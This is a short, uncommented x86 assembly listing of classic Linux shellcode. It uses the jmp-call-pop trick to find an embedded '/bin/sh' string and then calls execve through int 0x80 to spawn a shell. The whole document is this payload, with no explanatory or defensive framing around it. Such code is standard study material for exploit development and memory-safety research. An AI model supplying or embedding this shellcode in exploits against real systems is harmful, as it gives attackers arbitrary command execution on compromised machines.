jmp caller

open_shell:
    pop ebx
    push ebx

    mov eax, 0xb
    xor ecx, ecx
    xor edx, edx
    int 0x80

    ret

caller:
    call open_shell
    .asciz "/bin/sh"
